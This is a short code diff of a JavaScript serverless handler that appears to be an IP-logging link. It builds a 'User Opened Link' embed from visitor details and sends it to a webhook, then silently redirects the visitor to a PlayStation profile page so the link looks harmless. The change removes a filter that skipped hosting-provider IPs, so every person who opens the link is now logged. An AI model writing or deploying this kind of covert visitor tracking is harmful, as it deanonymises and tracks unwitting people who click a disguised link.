@@ -144,8 +144,7 @@ export default async function handler(req, res) {
 
 
         // Default: Full Info for Other Requests
-        if (!ipDetails.hosting) {
-            const message = {
+        const message = {
                 embeds: [
                     {
                         title: "User Opened Link",
@@ -180,7 +179,6 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-        }
 
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
